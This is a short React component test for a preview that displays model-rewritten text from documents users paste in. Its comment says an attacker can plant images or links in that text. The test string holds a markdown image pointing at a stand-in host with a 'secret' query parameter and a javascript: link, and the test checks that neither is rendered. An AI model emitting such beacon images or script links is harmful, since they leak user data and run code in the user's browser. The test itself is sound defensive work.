import { describe, it, expect, vi } from 'vitest';
import { render, screen } from '@testing-library/react';
import { PolishPreview } from '#/routes/_authenticated/applications/$applicationId/-components/PolishPreview';

const noop = vi.fn();

/*
 * The polished text is written by a model from a document the user pasted or
 * imported, so it can carry an image or a link an attacker planted (JEF-548).
 * The preview renders it through `Markdown`, which must not fetch or link it.
 */
describe('PolishPreview with model-written images and links', () => {
  it('shows an image as its alt text and an unsafe link as text', () => {
    const { container } = render(
      <PolishPreview
        markdown={
          'Polished letter. ![pixel](https://evil.example/p.png?d=secret) [open](javascript:alert(1))'
        }
        onReplace={noop}
        onInsert={noop}
        onDiscard={noop}
      />,
    );

    expect(screen.getByText(/Polished letter/)).toBeInTheDocument();
    expect(container.querySelector('img')).toBeNull();
    expect(container.innerHTML).not.toContain('evil.example');
    expect(container.querySelector('[href^="javascript:"]')).toBeNull();
  });
});
